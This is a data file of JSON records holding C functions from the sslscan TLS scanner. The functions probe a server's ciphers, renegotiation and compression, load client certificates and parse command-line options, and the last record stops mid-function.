{"docstring": "// Test for preferred ciphers\n", "func_signal": "int test_default_cipher(struct sslCheckOptions *options, const const SSL_METHOD *ssl_method)", "code": "{\n\t// Variables...\n\tint cipherStatus;\n\tint status = true;\n\tint socketDescriptor = 0;\n\tSSL *ssl = NULL;\n\tBIO *cipherConnectionBio;\n\tint tempInt;\n\tint tempInt2;\n\n\t// Connect to host\n\tsocketDescriptor = tcpConnect(options);\n\tif (socketDescriptor == 0)\n\t\treturn false;\n\n\t// Setup Context Object...\n\toptions->ctx = SSL_CTX_new(ssl_method);\n\tif (options->ctx == NULL) {\n\t\tprintf(\"%sERROR: Could not create CTX object.%s\\n\", COL_RED, RESET);\n\t\tclose(socketDescriptor);\n\t\treturn false;\n\t}\n\n\tif (SSL_CTX_set_cipher_list(options->ctx, \"ALL:COMPLEMENTOFALL\") == 0) {\n\t\tprintf(\"%s    ERROR: Could set cipher.%s\\n\", COL_RED, RESET);\n\n\t\t// Free CTX Object\n\t\tSSL_CTX_free(options->ctx);\n\t\tclose(socketDescriptor);\n\t\treturn false;\n\t}\n\n\t// Load Certs if required...\n\tif ((options->clientCertsFile != 0) || (options->privateKeyFile != 0)) {\n\t\tif(loadCerts(options) == false) {\n\t\t\tSSL_CTX_free(options->ctx);\n\t\t\tclose(socketDescriptor);\n\t\t\treturn false;\n\t\t}\n\t}\n\n\t// Create SSL object...\n\tssl = SSL_new(options->ctx);\n\tif (ssl == NULL) {\n\t\tstatus = false;\n\t\tprintf(\"%s    ERROR: Could create SSL object.%s\\n\", COL_RED, RESET);\n\n\t\t// Free CTX Object\n\t\tSSL_CTX_free(options->ctx);\n\t\tclose(socketDescriptor);\n\t\treturn false;\n\t}\n\n\talert_queue_free();\n\tSSL_set_info_callback(ssl, callback_ssl_info);\n\t// Connect socket and BIO\n\tcipherConnectionBio = BIO_new_socket(socketDescriptor, BIO_NOCLOSE);\n\n\t// Connect SSL and BIO\n\tSSL_set_bio(ssl, cipherConnectionBio, cipherConnectionBio);\n\n#if OPENSSL_VERSION_NUMBER >= 0x0090806fL && !defined(OPENSSL_NO_TLSEXT)\n\t// TLS SNI\n\tSSL_set_tlsext_host_name (ssl, options->host);\n#endif\n\n\t// Connect SSL over socket\n\tcipherStatus = SSL_connect(ssl);\n\n\tget_certificate(options, ssl);\n\tget_compression(options, ssl);\n\tchar method_name[32];\n\tint method_id = get_ssl_method_name(ssl_method, method_name, sizeof(method_name));\n\n\tstruct sslCipher *cipher;\n\tcipher = malloc(sizeof(struct sslCipher));\n\tmemset(cipher, 0, sizeof(struct sslCipher));\n\tcipher->next = NULL;\n\tconst SSL_CIPHER *c = SSL_get_current_cipher(ssl);\n\n\t// Add cipher information...\n\tcipher->sslMethod = ssl_method;\n\tcipher->name = SSL_CIPHER_get_name(c);\n\tcipher->version = SSL_CIPHER_get_version(c);\n\tcipher->bits = SSL_CIPHER_get_bits(c, &cipher->alg_bits);\n\t//SSL_CIPHER_description(c, &cipher->description, sizeof(cipher->description) - 1);\n\n\tPyObject *py_tmp;\n\tPyObject *py_ciphers;\n\tPyObject *py_result;\n\n\tPyObject *py_module = PyImport_ImportModule(\"sslscan.ssl\");\n\tif (py_module == NULL) {\n\t\tPyErr_Print();\n\t\t// ToDo:\n\t\treturn 1;\n\t}\n\n\tint tmp_int;\n\n\tif (cipherStatus < 0) {\n\t\ttmp_int = SSLSCAN_CIPHER_STATUS_FAILED;\n\t\tstatus = false;\n\t} else if (cipherStatus == 0) {\n\t\ttmp_int = SSLSCAN_CIPHER_STATUS_REJECTED;\n\t\tstatus = true;\n\t\tif (g_ssl_alert_queue != NULL) {\n\t\t\t// rejected + first alert type is fatal -> failed internal (info used for fast scan mode)\n\t\t\tif (strcmp(\"F\", SSL_alert_type_string(g_ssl_alert_queue->ret)) == 0)\n\t\t\t\tstatus = false;\n\t\t}\n\t} else if(cipherStatus == 1) {\n\t\ttmp_int = SSLSCAN_CIPHER_STATUS_ACCEPTED;\n\t\tstatus = true;\n\t} else {\n\t\ttmp_int = SSLSCAN_CIPHER_STATUS_UNKNOWN;\n\t\tstatus = false;\n\t}\n\n\tPyObject *py_args = PyTuple_New(3);\n\tPyTuple_SetItem(py_args, 0, PyCapsule_New((void*) cipher, \"cipher\", NULL));\n\tPyTuple_SetItem(py_args, 1, PyCapsule_New((void*) g_ssl_alert_queue, \"alerts\", NULL));\n\tPyTuple_SetItem(py_args, 2, PyCapsule_New((void*) &tmp_int, \"status\", NULL));\n\tpy_call_function(py_module, \"Cipher\", py_args, &py_result);\n\n\t// reset queue, ToDo:\n\tg_ssl_alert_queue = NULL;\n\n\tpy_ciphers = PyDict_GetItemString(options->host_result, \"ciphers.default\");\n\tPyDict_SetItemString(py_ciphers, method_name, py_result);\n\n\tif (cipherStatus == 1) {\n\t\t// Disconnect SSL over socket\n\t\tSSL_shutdown(ssl);\n\t}\n\n\t// Free SSL object\n\tSSL_free(ssl);\n\n\t// Free CTX Object\n\tSSL_CTX_free(options->ctx);\n\n\tclose(socketDescriptor);\n\n\treturn status;\n}", "path": "src\\probe.c", "repo_name": "DinoTools/sslscan", "stars": 89, "license": "gpl-3.0", "language": "c", "size": 557}
{"docstring": "// Read a line from the input...\n", "func_signal": "void readLine(FILE *input, char *lineFromFile, int maxSize)", "code": "{\n\t// Variables...\n\tint stripPointer;\n\n\t// Read line from file...\n\tfgets(lineFromFile, maxSize, input);\n\n\t// Clear the end-of-line stuff...\n\tstripPointer = strlen(lineFromFile) -1;\n\twhile (stripPointer >= 0 && ((lineFromFile[stripPointer] == '\\r') || (lineFromFile[stripPointer] == '\\n') || (lineFromFile[stripPointer] == ' ')))\n\t{\n\t\tlineFromFile[stripPointer] = 0;\n\t\tstripPointer--;\n\t}\n}", "path": "src\\helper.c", "repo_name": "DinoTools/sslscan", "stars": 89, "license": "gpl-3.0", "language": "c", "size": 557}
{"docstring": "// Load client certificates/private keys...\n", "func_signal": "int loadCerts(struct sslCheckOptions *options)", "code": "{\n\t// Variables...\n\tint status = 1;\n\tPKCS12 *pk12 = NULL;\n\tFILE *pk12File = NULL;\n\tX509 *cert = NULL;\n\tEVP_PKEY *pkey = NULL;\n\tSTACK_OF(X509) *ca = NULL;\n\n\t// Configure PKey password...\n\tif (options->privateKeyPassword != 0)\n\t{\n\t\tSSL_CTX_set_default_passwd_cb_userdata(options->ctx, (void *)options->privateKeyPassword);\n\t\tSSL_CTX_set_default_passwd_cb(options->ctx, password_callback);\n\t}\n\n\t// Seperate Certs and PKey Files...\n\tif ((options->clientCertsFile != 0) && (options->privateKeyFile != 0))\n\t{\n\t\t// Load Cert...\n\t\tif (!SSL_CTX_use_certificate_file(options->ctx, options->clientCertsFile, SSL_FILETYPE_PEM))\n\t\t{\n\t\t\tif (!SSL_CTX_use_certificate_file(options->ctx, options->clientCertsFile, SSL_FILETYPE_ASN1))\n\t\t\t{\n\t\t\t\tif (!SSL_CTX_use_certificate_chain_file(options->ctx, options->clientCertsFile))\n\t\t\t\t{\n\t\t\t\t\tprintf(\"%s    Could not configure certificate(s).%s\\n\", COL_RED, RESET);\n\t\t\t\t\tstatus = 0;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\t// Load PKey...\n\t\tif (status != 0)\n\t\t{\n\t\t\tif (!SSL_CTX_use_PrivateKey_file(options->ctx, options->privateKeyFile, SSL_FILETYPE_PEM))\n\t\t\t{\n\t\t\t\tif (!SSL_CTX_use_PrivateKey_file(options->ctx, options->privateKeyFile, SSL_FILETYPE_ASN1))\n\t\t\t\t{\n\t\t\t\t\t// Why would the more specific functions succeed if the generic functions failed?\n\t\t\t\t\t// -- I'm guessing that the original author was hopeful? - io\n\t\t\t\t\tif (!SSL_CTX_use_RSAPrivateKey_file(options->ctx, options->privateKeyFile, SSL_FILETYPE_PEM))\n\t\t\t\t\t{\n\t\t\t\t\t\tif (!SSL_CTX_use_RSAPrivateKey_file(options->ctx, options->privateKeyFile, SSL_FILETYPE_ASN1))\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tprintf(\"%s    Could not configure private key.%s\\n\", COL_RED, RESET);\n\t\t\t\t\t\t\tstatus = 0;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\t// PKCS Cert and PKey File...\n\telse if (options->privateKeyFile != 0)\n\t{\n\t\tpk12File = fopen(options->privateKeyFile, \"rb\");\n\t\tif (pk12File != NULL)\n\t\t{\n\t\t\tpk12 = d2i_PKCS12_fp(pk12File, NULL);\n\t\t\tif (!pk12)\n\t\t\t{\n\t\t\t\tstatus = 0;\n\t\t\t\tprintf(\"%s    Could not read PKCS#12 file.%s\\n\", COL_RED, RESET);\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tif (!PKCS12_parse(pk12, options->privateKeyPassword, &pkey, &cert, &ca))\n\t\t\t\t{\n\t\t\t\t\tstatus = 0;\n\t\t\t\t\tprintf(\"%s    Error parsing PKCS#12. Are you sure that password was correct?%s\\n\", COL_RED, RESET);\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tif (!SSL_CTX_use_certificate(options->ctx, cert))\n\t\t\t\t\t{\n\t\t\t\t\t\tstatus = 0;\n\t\t\t\t\t\tprintf(\"%s    Could not configure certificate.%s\\n\", COL_RED, RESET);\n\t\t\t\t\t}\n\t\t\t\t\tif (!SSL_CTX_use_PrivateKey(options->ctx, pkey))\n\t\t\t\t\t{\n\t\t\t\t\t\tstatus = 0;\n\t\t\t\t\t\tprintf(\"%s    Could not configure private key.%s\\n\", COL_RED, RESET);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tPKCS12_free(pk12);\n\t\t\t}\n\t\t\tfclose(pk12File);\n\t\t}\n\t\telse\n\t\t{\n\t\t\tprintf(\"%s    Could not open PKCS#12 file.%s\\n\", COL_RED, RESET);\n\t\t\tstatus = 0;\n\t\t}\n\t}\n\n\t// Check Cert/Key...\n\tif (status != 0)\n\t{\n\t\tif (!SSL_CTX_check_private_key(options->ctx))\n\t\t{\n\t\t\tprintf(\"%s    Prvate key does not match certificate.%s\\n\", COL_RED, RESET);\n\t\t\treturn false;\n\t\t}\n\t\telse\n\t\t\treturn true;\n\t}\n\telse\n\t\treturn false;\n}", "path": "src\\probe.c", "repo_name": "DinoTools/sslscan", "stars": 89, "license": "gpl-3.0", "language": "c", "size": 557}
{"docstring": "/**\n * Test a cipher.\n */\n", "func_signal": "int test_cipher(struct sslCheckOptions *options, struct sslCipher *sslCipherPointer)", "code": "{\n\t// Variables...\n\tint cipherStatus;\n\tint socketDescriptor = 0;\n\tSSL *ssl = NULL;\n\tBIO *cipherConnectionBio;\n\tBIO *stdoutBIO = NULL;\n\tint tempInt;\n\tchar requestBuffer[200];\n\tchar buffer[50];\n\tint resultSize = 0;\n\tint tmp_int = 0;\n\n\t// Create request buffer...\n\tmemset(requestBuffer, 0, 200);\n\tsnprintf(requestBuffer, 199, \"GET / HTTP/1.0\\r\\nUser-Agent: SSLScan\\r\\nHost: %s\\r\\n\\r\\n\", options->host);\n\n\tsocketDescriptor = tcpConnect(options);\n\tif (socketDescriptor == 0)\n\t\t// ToDo: error code\n\t\treturn 1;\n\n\tif (SSL_CTX_set_cipher_list(options->ctx, sslCipherPointer->name) == 0) {\n\t\tprintf(\"%s    ERROR: Could set cipher %s.%s\\n\", COL_RED, sslCipherPointer->name, RESET);\n\t\tclose(socketDescriptor);\n\t\t// ToDo: error code\n\t\treturn 1;\n\t}\n\n\tssl = SSL_new(options->ctx);\n\tif (ssl == NULL) {\n\t\tprintf(\"%s    ERROR: Could create SSL object.%s\\n\", COL_RED, RESET);\n\t\tclose(socketDescriptor);\n\t\t// ToDo: error code\n\t\treturn 1;\n\t}\n\n\talert_queue_free();\n\tSSL_set_info_callback(ssl, callback_ssl_info);\n\t// Connect socket and BIO\n\tcipherConnectionBio = BIO_new_socket(socketDescriptor, BIO_NOCLOSE);\n\n\t// Connect SSL and BIO\n\tSSL_set_bio(ssl, cipherConnectionBio, cipherConnectionBio);\n\n#if OPENSSL_VERSION_NUMBER >= 0x0090806fL && !defined(OPENSSL_NO_TLSEXT)\n\t// This enables TLS SNI\n\tSSL_set_tlsext_host_name (ssl, options->host);\n#endif\n\n\t// Connect SSL over socket\n\tcipherStatus = SSL_connect(ssl);\n\n\tPyObject *py_tmp;\n\tPyObject *py_ciphers;\n\tPyObject *py_result;\n\n\tPyObject *py_module = PyImport_ImportModule(\"sslscan.ssl\");\n\tif (py_module == NULL) {\n\t\tPyErr_Print();\n\t\t// ToDo:\n\t\treturn 1;\n\t}\n\n\tif (cipherStatus < 0)\n\t\ttmp_int = SSLSCAN_CIPHER_STATUS_FAILED;\n\telse if (cipherStatus == 0)\n\t\ttmp_int = SSLSCAN_CIPHER_STATUS_REJECTED;\n\telse if(cipherStatus == 1)\n\t\ttmp_int = SSLSCAN_CIPHER_STATUS_ACCEPTED;\n\telse\n\t\ttmp_int = SSLSCAN_CIPHER_STATUS_UNKNOWN;\n\n\tPyObject *py_args = PyTuple_New(3);\n\tPyTuple_SetItem(py_args, 0, PyCapsule_New((void*) sslCipherPointer, \"cipher\", NULL));\n\tif (g_ssl_alert_queue != NULL)\n\t\tPyTuple_SetItem(py_args, 1, PyCapsule_New((void*) g_ssl_alert_queue, \"alerts\", NULL));\n\tPyTuple_SetItem(py_args, 2, PyCapsule_New((void*) &tmp_int, \"status\", NULL));\n\tpy_call_function(py_module, \"Cipher\", py_args, &py_result);\n\n\t// reset queue, ToDo:\n\tg_ssl_alert_queue = NULL;\n\n\tpy_ciphers = PyDict_GetItemString(options->host_result, \"ciphers\");\n\tPyList_Append(py_ciphers, py_result);\n\n\t// Disconnect SSL over socket\n\tif (cipherStatus == 1)\n\t\tSSL_shutdown(ssl);\n\n\t// Free SSL object\n\tSSL_free(ssl);\n\n\tclose(socketDescriptor);\n\n\treturn 0;\n}", "path": "src\\probe.c", "repo_name": "DinoTools/sslscan", "stars": 89, "license": "gpl-3.0", "language": "c", "size": 557}
{"docstring": "/**\n * Parse commandline args\n */\n", "func_signal": "int parse_args(int argc, char *argv[], struct sslCheckOptions *options)", "code": "{\n\tPyObject *py_tmp;\n\tint i;\n\n\tPyObject *py_config_set = PyObject_GetAttrString(options->py_config, \"set_value\");\n\n\t// Get program parameters\n\tfor (i = 1; i < argc; i++)\n\t{\n\t\tif (strcmp(\"--help\", argv[i]) == 0) {\n\t\t\tprint_help(argv[0], options);\n\t\t\treturn 0;\n\t\t}\n\n\t\tif ((strncmp(\"--help-output=\", argv[i], 14) == 0) && (strlen(argv[i]) > 14)) {\n\t\t\tpy_tmp = Py_BuildValue(\"(s)\", argv[i] + 14);\n\t\t\treturn py_call_function(options->py_output_handler, \"print_help_verbose\", py_tmp, NULL);\n\t\t}\n\n\t\tif (strcmp(\"--help-outputs\", argv[i]) == 0) {\n\t\t\treturn py_call_function(options->py_output_handler, \"print_help\", NULL, NULL);\n\t\t}\n\n\t\tif (strcmp(\"--help-output-list\", argv[i]) == 0) {\n\t\t\treturn py_call_function(options->py_output_handler, \"print_list\", NULL, NULL);\n\t\t}\n\n\t\tif ((strncmp(\"--targets=\", argv[i], 10) == 0) && (strlen(argv[i]) > 10)) {\n\t\t\toptions->targets = argv[i] + 10;\n\t\t\tcontinue;\n\t\t}\n\n\t\tif ((strcmp(\"--ipv4\", argv[i]) == 0)) {\n\t\t\toptions->forceAddressFamily = FORCE_AF_INET4;\n\t\t\tcontinue;\n\t\t}\n\n\t\tif ((strcmp(\"--ipv6\", argv[i]) == 0)) {\n\t\t\toptions->forceAddressFamily = FORCE_AF_INET6;\n\t\t\tcontinue;\n\t\t}\n\n\t\tif ((strncmp(\"--localip=\", argv[i], 10) == 0) && (strlen(argv[i]) > 10)) {\n\t\t\toptions->bindLocalAddress = true;\n\t\t\tstrncpy(options->localAddress, argv[i] + 10, sizeof(options->localAddress));\n\t\t\tcontinue;\n\t\t}\n\n\t\tif ((strncmp(\"--connection_delay=\", argv[i], 19) == 0) && (strlen(argv[i]) > 19)) {\n\t\t\toptions->connection_delay = strtol(argv[i] + 19, NULL, 10);\n\t\t\tcontinue;\n\t\t}\n\n\t\tif (strcmp(\"--no-failed\", argv[i]) == 0) {\n\t\t\toptions->noFailed = true;\n\t\t\tcontinue;\n\t\t}\n\n\t\tif (strcmp(\"--version\", argv[i]) == 0) {\n\t\t\tprint_version();\n\t\t\treturn 0;\n\t\t}\n\n\t\tif (strncmp(\"--xml=\", argv[i], 6) == 0) {\n\t\t\t//ToDo\n\t\t\t//xmlArg = i;\n\t\t\tcontinue;\n\t\t}\n\n\t\tif (strcmp(\"--verbose\", argv[i]) == 0) {\n\t\t\toptions->verbose = true;\n\t\t\tcontinue;\n\t\t}\n\n\t\tif (strcmp(\"-p\", argv[i]) == 0) {\n\t\t\toptions->pout = true;\n\t\t\tcontinue;\n\t\t}\n\n\t\t// Client Certificates\n\t\tif (strncmp(\"--certs=\", argv[i], 8) == 0) {\n\t\t\toptions->clientCertsFile = argv[i] +8;\n\t\t\tcontinue;\n\t\t}\n\n\t\t// Private Key File\n\t\tif (strncmp(\"--pk=\", argv[i], 5) == 0) {\n\t\t\toptions->privateKeyFile = argv[i] +5;\n\t\t\tcontinue;\n\t\t}\n\n\t\t// Private Key Password\n\t\tif (strncmp(\"--pkpass=\", argv[i], 9) == 0) {\n\t\t\toptions->privateKeyPassword = argv[i] +9;\n\t\t\tcontinue;\n\t\t}\n\n\t\t// Should we check for TLS renegotiation?\n\t\tif (strcmp(\"--renegotiation\", argv[i]) == 0) {\n\t\t\toptions->reneg = true;\n\t\t\tcontinue;\n\t\t}\n\n\t\t// Should we check for Heartbleed?\n\t\tif (strcmp(\"--heartbleed\", argv[i]) == 0) {\n\t\t\toptions->heartbleed = true;\n\t\t\tcontinue;\n\t\t}\n\n\t\t// StartTLS... FTP\n\t\tif (strcmp(\"--starttls-ftp\", argv[i]) == 0) {\n\t\t\toptions->ssl_versions = tls_v10;\n\t\t\toptions->starttls_ftp = true;\n\t\t\tcontinue;\n\t\t}\n\n\t\t// StartTLS... IMAP\n\t\tif (strcmp(\"--starttls-imap\", argv[i]) == 0) {\n\t\t\toptions->ssl_versions = tls_v10;\n\t\t\toptions->starttls_imap = true;\n\t\t\tcontinue;\n\t\t}\n\n\t\t// StartTLS... POP3\n\t\tif (strcmp(\"--starttls-pop3\", argv[i]) == 0) {\n\t\t\toptions->ssl_versions = tls_v10;\n\t\t\toptions->starttls_pop3 = true;\n\t\t\tcontinue;\n\t\t}\n\n\t\t// StartTLS... SMTP\n\t\tif (strcmp(\"--starttls-smtp\", argv[i]) == 0) {\n\t\t\toptions->ssl_versions = tls_v10;\n\t\t\toptions->starttls_smtp = true;\n\t\t\tcontinue;\n\t\t}\n\n\t\t// StartTLS... XMPP\n\t\tif (strcmp(\"--starttls-xmpp\", argv[i]) == 0) {\n\t\t\toptions->ssl_versions = tls_v10;\n\t\t\toptions->starttls_xmpp = true;\n\t\t\tcontinue;\n\t\t}\n\n\t\t// XMPP... Domain\n\t\tif (strncmp(\"--xmpp-domain=\", argv[i], 14) == 0) {\n\t\t\toptions->xmpp_domain = argv[i] +14;\n\t\t\tcontinue;\n\t\t}\n\n#ifndef OPENSSL_NO_SSL2\n\t\tif (strcmp(\"--ssl2\", argv[i]) == 0) {\n\t\t\toptions->ssl_versions = ssl_v2;\n\t\t\tcontinue;\n\t\t}\n#endif // #ifndef OPENSSL_NO_SSL2\n\n\t\tif (strcmp(\"--ssl3\", argv[i]) == 0) {\n\t\t\toptions->ssl_versions = ssl_v3;\n\t\t\tcontinue;\n\t\t}\n\n\t\tif (strcmp(\"--tls1\", argv[i]) == 0) {\n\t\t\toptions->ssl_versions = tls_v10;\n\t\t\tcontinue;\n\t\t}\n\n#if OPENSSL_VERSION_NUMBER >= 0x1000008fL || OPENSSL_VERSION_NUMBER >= 0x1000100fL\n\t\tif (strcmp(\"--tls11\", argv[i]) == 0) {\n\t\t\toptions->ssl_versions = tls_v11;\n\t\t\tcontinue;\n\t\t}\n\n\t\tif (strcmp(\"--tls12\", argv[i]) == 0) {\n\t\t\toptions->ssl_versions = tls_v12;\n\t\t\tcontinue;\n\t\t}\n#endif // #if OPENSSL_VERSION_NUMBER >= 0x1000008fL || OPENSSL_VERSION_NUMBER >= 0x1000100fL\n\n\t\tif (strcmp(\"--no_ssl2\", argv[i]) == 0) {\n\t\t\toptions->ssl_versions &= ~ssl_v2;\n\t\t\tcontinue;\n\t\t}\n\n\t\tif (strcmp(\"--no_ssl3\", argv[i]) == 0) {\n\t\t\toptions->ssl_versions &= ~ssl_v3;\n\t\t\tcontinue;\n\t\t}\n\n\t\tif (strcmp(\"--no_tls1\", argv[i]) == 0) {\n\t\t\toptions->ssl_versions &= ~tls_v10;\n\t\t\tcontinue;\n\t\t}\n\n\t\tif (strcmp(\"--no_tls11\", argv[i]) == 0) {\n\t\t\toptions->ssl_versions &= ~tls_v11;\n\t\t\tcontinue;\n\t\t}\n\n\t\tif (strcmp(\"--no_tls12\", argv[i]) == 0) {\n\t\t\toptions->ssl_versions &= ~tls_v12;\n\t\t\tcontinue;\n\t\t}\n\n\t\tif (strcmp(\"--bugs\", argv[i]) == 0) {\n\t\t\toptions->sslbugs = 1;\n\t\t\tcontinue;\n\t\t}\n\n\t\telse if (strncmp(\"--scan_mode=\", argv[i], 12) == 0) {\n\t\t\tif (strcmp(\"fast\", argv[i] + 12) == 0) {\n\t\t\t\toptions->scan_mode = SSLSCAN_SCAN_MODE_FAST;\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\tif (strcmp(\"full\", argv[i] + 12) == 0) {\n\t\t\t\toptions->scan_mode = SSLSCAN_SCAN_MODE_FULL;\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\t// ToDo: print error msg\n\t\t\tprint_help(argv[0], options);\n\t\t\treturn 0;\n\t\t}\n\n\t\t// SSL HTTP Get...\n\t\telse if (strcmp(\"--http\", argv[i]) == 0) {\n\t\t\toptions->http = 1;\n\t\t\tcontinue;\n\t\t}\n\n\t\tif (strncmp(\"--output=\", argv[i], 9) == 0) {\n\t\t\tif(options->py_output_handler == NULL) {\n\t\t\t\tprintf(\"No output handler\");\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\tPyObject *py_func = PyObject_GetAttrString(options->py_output_handler, \"load_from_string\");\n\t\t\tPyObject *py_args = PyTuple_New(1);\n\t\t\tPyTuple_SetItem(py_args, 0, PyUnicode_FromString(argv[i] + 9));\n\t\t\tPyObject *py_result = PyObject_CallObject(py_func, py_args);\n\t\t\tif(py_result == NULL) {\n\t\t\t\tPyErr_Print();\n\t\t\t}\n\t\t\tcontinue;\n\t\t}\n\n\t\tif (strncmp(\"--\", argv[i], 2) == 0) {\n\t\t\tPyObject *py_result;\n\t\t\tPyObject *py_args = PyTuple_New(1);\n\t\t\tPyTuple_SetItem(py_args, 0, PyUnicode_FromString(argv[i] + 2));\n\t\t\tpy_call_function(options->py_config, \"set_value_from_string\", py_args, &py_result);\n\t\t\tif (PyObject_RichCompareBool(py_result, PyBool_FromLong(1), Py_EQ) == 1)\n\t\t\t\tcontinue;\n\t\t}\n\n\t\t// Host\n\t\tif (strncmp(\"--\", argv[i], 2) != 0) {\n\t\t\t// Get host...\n\t\t\tparseHostString(argv[i], options);\n\t\t\tcontinue;\n\t\t}\n\n\t\tprintf(\"Unknown option: '%s'\\n\", argv[i]);\n\t\tprint_help(argv[0], options);\n\t\t// ToDo: define error codes\n\t\treturn 1;\n\t}\n\treturn 0;\n}", "path": "src\\main.c", "repo_name": "DinoTools/sslscan", "stars": 89, "license": "gpl-3.0", "language": "c", "size": 557}
{"docstring": "/**\n * Wait at least the specified number of milliseconds. This function is used\n * to limit the number of connections per second.\n */\n", "func_signal": "void delay_connection(struct sslCheckOptions *options)", "code": "{\n\tstruct timeval next;\n\tstruct timeval result;\n\tstruct timeval cur_time;\n\tstruct timespec delay;\n\n\tif (options->connection_delay <= 0)\n\t\treturn;\n\n\tnext = options->connection_time;\n\tnext.tv_sec += options->connection_delay / 1000;\n\tnext.tv_usec += options->connection_delay % 1000 * 1000;\n\n\twhile (next.tv_usec > 999999) {\n\t\tnext.tv_sec++;\n\t\tnext.tv_usec -= 1000000;\n\t}\n\n\tgettimeofday(&cur_time, NULL);\n\n\twhile(timeval_substract(&next, &cur_time, &result) >= 0) {\n\t\tdelay.tv_sec = result.tv_sec;\n\t\tdelay.tv_nsec = result.tv_usec * 1000;\n\t\tnanosleep(&delay, NULL);\n\t\tgettimeofday(&cur_time, NULL);\n\t}\n\toptions->connection_time = cur_time;\n}", "path": "src\\helper.c", "repo_name": "DinoTools/sslscan", "stars": 89, "license": "gpl-3.0", "language": "c", "size": 557}
{"docstring": "/**\n * Subtract two time values and return the result.\n * Result:\n * - 1 t1 > t2\n * - 0 t1 = t2\n * - -1 t1 < t2\n */\n", "func_signal": "int timeval_substract(struct timeval *t1, struct timeval *t2, struct timeval *result)", "code": "{\n\t  while (t1->tv_usec > 999999) {\n\t\tt1->tv_sec += t1->tv_usec / 1000000;\n\t\tt1->tv_usec %= 1000000;\n\t  }\n\n\t  while (t2->tv_usec > 999999) {\n\t\tt2->tv_sec += t2->tv_usec / 1000000;\n\t\tt2->tv_usec %= 1000000;\n\t  }\n\n\t  result->tv_sec = t1->tv_sec - t2->tv_sec;\n\n\t  if ((result->tv_usec = t1->tv_usec - t2->tv_usec) < 0) {\n\t\tresult->tv_usec += 1000000;\n\t\tresult->tv_sec--;\n\t  }\n\n\t  if (result->tv_sec == 0 && result->tv_usec == 0)\n\t\t  return 0;\n\n\t  if (result->tv_sec >= 0)\n\t\t  return 1;\n\n\t  return -1;\n}", "path": "src\\helper.c", "repo_name": "DinoTools/sslscan", "stars": 89, "license": "gpl-3.0", "language": "c", "size": 557}
{"docstring": "/**\n * Get compression information from ssl session.\n */\n", "func_signal": "int get_compression(struct sslCheckOptions *options, SSL *ssl)", "code": "{\n\tif (options->host_state.extracted_information & SSLSCAN_HOST_INFO_COMPRESSION)\n\t\treturn true;\n\n#ifndef OPENSSL_NO_COMP\n\tPyObject *py_obj;\n\tconst COMP_METHOD *compression, *expansion;\n\n\tcompression = SSL_get_current_compression(ssl);\n\texpansion = SSL_get_current_expansion(ssl);\n\n\tif (compression)\n\t\tpy_obj = PyUnicode_FromString(SSL_COMP_get_name(compression));\n\telse\n\t\tpy_obj = Py_BuildValue(\"\");\n\n\tPyDict_SetItemString(options->host_result, \"session.compression\", py_obj);\n\n\tif (expansion)\n\t\tpy_obj = PyUnicode_FromString(SSL_COMP_get_name(expansion));\n\telse\n\t\tpy_obj = Py_BuildValue(\"\");\n\n\tPyDict_SetItemString(options->host_result, \"session.expansion\", py_obj);\n#endif\n\n\toptions->host_state.extracted_information |= SSLSCAN_HOST_INFO_COMPRESSION;\n\treturn true;\n}", "path": "src\\probe.c", "repo_name": "DinoTools/sslscan", "stars": 89, "license": "gpl-3.0", "language": "c", "size": 557}
{"docstring": "/**\n * Check if the server supports renegotiation\n *\n */\n", "func_signal": "int test_renegotiation(struct sslCheckOptions *options, const SSL_METHOD *ssl_method)", "code": "{\n\t// Variables...\n\tint cipherStatus;\n\tint status = true;\n\t//int secure = false;\n\tint socketDescriptor = 0;\n\tint res;\n\tSSL *ssl = NULL;\n\tBIO *cipherConnectionBio;\n\tstruct renegotiationOutput result;\n\n\tresult.supported = false;\n\tresult.secure = false;\n\n\toptions->ctx = SSL_CTX_new(ssl_method);\n\ttls_reneg_init(options);\n\n\t// Connect to host\n\tsocketDescriptor = tcpConnect(options);\n\tif (socketDescriptor == 0) {\n\t\t// Could not connect\n\t\tfprintf(stderr, \"%sERROR: Could not connect.%s\\n\", COL_RED, RESET);\n\t\tresult.supported = false;\n\t\treturn false;\n\t}\n\n\t// Setup Context Object...\n\toptions->ctx = SSL_CTX_new(ssl_method);\n\tif (options->ctx == NULL) {\n\t\tresult.supported = false;\n\t\tfprintf(stderr, \"%sERROR: Could not create CTX object.%s\\n\", COL_RED, RESET);\n\t\tclose(socketDescriptor);\n\n\t\ttest_renegotiation_process_result(options, result);\n\t\treturn false;\n\t}\n\tif (SSL_CTX_set_cipher_list(options->ctx, \"ALL:COMPLEMENTOFALL\") == 0) {\n\t\tresult.supported = false;\n\t\tfprintf(stderr, \"%s    ERROR: Could set cipher.%s\\n\", COL_RED, RESET);\n\t\t// Free CTX Object\n\t\tSSL_CTX_free(options->ctx);\n\n\t\t// Disconnect from host\n\t\tclose(socketDescriptor);\n\n\t\ttest_renegotiation_process_result(options, result);\n\t\treturn false;\n\t}\n\n\t// Load Certs if required...\n\tif ((options->clientCertsFile != 0) || (options->privateKeyFile != 0)) {\n\t\tif (loadCerts(options) == false) {\n\t\t\t// Free CTX Object\n\t\t\tSSL_CTX_free(options->ctx);\n\n\t\t\t// Disconnect from host\n\t\t\tclose(socketDescriptor);\n\n\t\t\ttest_renegotiation_process_result(options, result);\n\t\t\treturn false;\n\t\t}\n\t}\n\n\t// Create SSL object...\n\tssl = SSL_new(options->ctx);\n\n#if ( OPENSSL_VERSION_NUMBER > 0x009080cfL )\n\t// Make sure we can connect to insecure servers\n\t// OpenSSL is going to change the default at a later date\n\tSSL_set_options(ssl, SSL_OP_LEGACY_SERVER_CONNECT);\n#endif\n\n\tif (ssl == NULL) {\n\t\tresult.supported = false;\n\t\tfprintf(stderr, \"%s    ERROR: Could create SSL object.%s\\n\", COL_RED, RESET);\n\n\t\t// Free CTX Object\n\t\tSSL_CTX_free(options->ctx);\n\n\t\t// Disconnect from host\n\t\tclose(socketDescriptor);\n\n\t\ttest_renegotiation_process_result(options, result);\n\t\treturn 